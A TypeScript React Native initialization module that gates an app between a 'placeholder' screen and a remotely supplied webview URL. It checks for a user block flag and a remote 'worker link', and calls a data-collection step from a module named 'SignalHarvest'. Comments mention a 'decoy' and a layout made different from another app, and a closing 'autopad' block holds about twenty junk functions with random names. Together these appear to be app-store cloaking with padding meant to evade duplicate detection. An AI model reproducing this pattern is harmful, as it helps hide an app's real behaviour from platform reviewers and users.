/* @app-slot:service */

import { Utils } from './UtilService';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { Alert, BackHandler } from 'react-native';
import { finKey } from './nativeConstants';
import { InitializationState, InitTarget, ResetInitializationRuntime, SynncPendingSendIdFromNative, SynncPendingPushUrlFromNative, AppenndSendId, InitializationRuntime } from './initializationShared';

export type { InitializationState };
import { ParallelCollectStep, SetupPushOpenHandlers } from './SignalHarvest';
import { InitStep, UnsubscribeFirebase } from './OfferResolve';
import { ViewportShow } from './ViewportHost';

const PLACEHOLDER_RESULT: InitializationState = { isLoadPlaceholder: true };
const INTERNET_FAILED_RESULT: InitializationState = { isLoadPlaceholder: false };
const WEBVIEW_RESULT: InitializationState = {
  isLoadPlaceholder: false,
  initTarget: InitTarget.webview,
};

export type MachineRunOptions = {
  retryInitialize?: () => Promise<InitializationState>;
};

async function CheckInternetConnection(
  Initialize: () => Promise<InitializationState>,
): Promise<boolean> {

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => {

      return (controller.abort());
    }, 15000);

    const response = await fetch('https://www.google.com', {
      method: 'HEAD',
      headers: {
        'Content-Type': 'application/json',
      },
      signal: controller.signal,
    });

    clearTimeout(timeoutId);
    return response.ok;
  } catch (error) {

    return new Promise<boolean>((resolve) => {

      Alert.alert(
        'No internet connection',
        'Please check your internet connection and try again',
        [
          {
            text: 'Retry',
            onPress: () => {

              Initialize()
                .then(() => {

                  return (resolve(false));
                })
                .catch(() => {

                  return (resolve(false));
                });
            },
          },
          {
            text: 'Exit',
            onPress: () => {

              BackHandler.exitApp();
              resolve(false);
            },
            style: 'destructive',
          },
        ],
        { cancelable: false },
      );
    });
  }
}

async function CheckBlockUser(): Promise<boolean> {

  try {
    const userBlock = await Utils.GetUserBlocke();
    return !!userBlock;
  } catch (error) {

    throw error;
  }
}

async function CheckFinalUrl(): Promise<string> {

  const finalUrl = await AsyncStorage.getItem(finKey);
  if (finalUrl && finalUrl !== '') {
    return AppenndSendId(
      finalUrl,
      InitializationRuntime.pendingSendId,
    );
  }
  return '';
}

async function CompletePlaceholder(
  result: InitializationState = PLACEHOLDER_RESULT,
): Promise<InitializationState> {

  return result;
}

async function ErrorFallback(): Promise<InitializationState> {

  try {
    await UnsubscribeFirebase('error fallback');
  } catch {
    // Best-effort cleanup.
  }
  return CompletePlaceholder();
}

/**
 * Diversified gate pipeline (different order/shape from Henway):
 * reset+decoy → internet → signal intake (sendId + pending push URL + push handlers)
 * → blocked → cached URL OR (getLink → collect → init)
 */
export async function RunInitializationFlow(
  options?: MachineRunOptions,
): Promise<InitializationState> {

  ResetInitializationRuntime();

  try {
    const retry =
      options?.retryInitialize ??
      (async (): Promise<InitializationState> => {

        return (INTERNET_FAILED_RESULT);
      });

    // 1) Internet check FIRST
    let hasInternet = false;
    try {
      hasInternet = await CheckInternetConnection(retry);
    } catch (error) {

      hasInternet = false;
    }
    if (!hasInternet) {
      return INTERNET_FAILED_RESULT;
    }

    // 2) Signal intake: sendId + pending push URL + push open handlers
    try {
      await SynncPendingSendIdFromNative();
    } catch (error) {

    }
    try {
      await SynncPendingPushUrlFromNative();
    } catch (error) {

    }
    try {
      await SetupPushOpenHandlers();
    } catch (error) {

    }

    // A failed decrypt used to store a user block. That flag survives an
    // in-place release install and skips the worker POST on every later launch.
    try {
      const blockResetKey = 'BlockResetV2';
      const blockReset = await AsyncStorage.getItem(blockResetKey);
      if (!blockReset) {
        await Utils.SetUserBlocke(0);
        await AsyncStorage.setItem(blockResetKey, '1');
      }
    } catch (error) {

    }

    // 3) Blocked check
    let isBlocked = false;
    try {
      isBlocked = await CheckBlockUser();
    } catch (error) {

      return ErrorFallback();
    }
    if (isBlocked) {
      try {
        await UnsubscribeFirebase('user blocked');
      } catch (error) {

      }
      return CompletePlaceholder();
    }

    // 4) Prefer cached final URL; getLink validation only when no cache
    let finalUrl = '';
    try {
      finalUrl = await CheckFinalUrl();
    } catch (error) {

      return ErrorFallback();
    }
    if (finalUrl) {
      try {
        await ViewportShow(finalUrl);
      } catch (error) {

      }
      return WEBVIEW_RESULT;
    }

    let link = '';
    try {
      link = await Utils.GetLink();
    } catch (error) {

      link = '';
    }
    if (!link) {
      try {
        await Utils.SetUserBlocke(1);
      } catch (error) {

      }
      try {
        await UnsubscribeFirebase('no worker link');
      } catch (error) {

      }
      return CompletePlaceholder();
    }

    try {
      await ParallelCollectStep();
    } catch (error) {

    }

    let initResult: InitializationState | null = null;
    try {
      initResult = await InitStep();
    } catch (error) {

      return ErrorFallback();
    }
    if (initResult !== null && initResult !== undefined) {
      return initResult;
    }

    try {
      await UnsubscribeFirebase('init step returned null');
    } catch (error) {

    }
    return CompletePlaceholder();
  } catch (error) {

    return PLACEHOLDER_RESULT;
  }
}

/** @deprecated Use RunInitializationFlow */
export const RunInitializationMachine = RunInitializationFlow;

export async function Initialize(
  options?: MachineRunOptions,
): Promise<InitializationState> {

  const retry = async (): Promise<InitializationState> => {

    return Initialize(options);
  };

  try {
    return await RunInitializationFlow({
      ...options,
      retryInitialize: options?.retryInitialize ?? retry,
    });
  } catch {
    return { isLoadPlaceholder: true };
  }
}

/* autopad-begin */
function sopojapo(_zunitoguxex: number, _okubuzocepep: boolean): string { return "kukevogi"; }
function exemut(_aritofebes: number, _jamisicujaw: string): string {
  let natikuwu: string = "perebefe";
  natikuwu = "kezaden";
  return natikuwu;
}
function alefuyuwat(_ayaseduw: string, _iwiwobe: string, _zomuzar: string): string { return "mezil"; }
function fojecage(_epaxape: string, _xucuyacoxed: string, _ikoquxivas: string): void {}
function nuxipumu(_elajejo: boolean, _ikiwegecuder: number): boolean { return false; }
function retavujo(_xelawiwusal: number, _taxabuq: number): string {
  let yafeqipipu: string = "bimozo";
  yafeqipipu = "xecewiq";
  return yafeqipipu;
}
function tosiqobaf(_itupunam: boolean, _gakixu: boolean, _mocipabeqeqo: string): number { return 217; }
function rubovu(): string {
  const siseme = 28;
  const irulunal: string = "lepa";
  return irulunal;
}
function budafolet(_gurewu: string, _ebiwagoge: number): string {
  const yaxodagozo = 3;
  const kusizixojuxa: string = "pogadum";
  return kusizixojuxa;
}
function sofafu(_zaluge: number): boolean {
  const dovajegep: boolean = false;
  return dovajegep;
}
function uvivimoko(_wokexojicik: number): string {
  let cigucezuku: string = "ayi";
  cigucezuku = "xiruki";
  return cigucezuku;
}
function imuqaci(_paxevi: boolean, _wuneyiwinuke: string): string {
  return "yadawu";
}
function dinela(): string { return "iyatiqu"; }
function ujutow(_oviwulixiki: string, _liperarobica: boolean, _edunowicen: boolean): void {
  const udetunayi = 1;
  if (udetunayi > 46) return;
}
function ologacayu(): void {
  const ateqex: boolean = true;
}
function uxugum(_zevazikoza: number, _jubiqiza: boolean): boolean { return false; }
function utafunejeyo(_aberelit: string, _nenocatalet: string, _terisugo: boolean): string {
  return "mitaqo";
}
/* autopad-end */

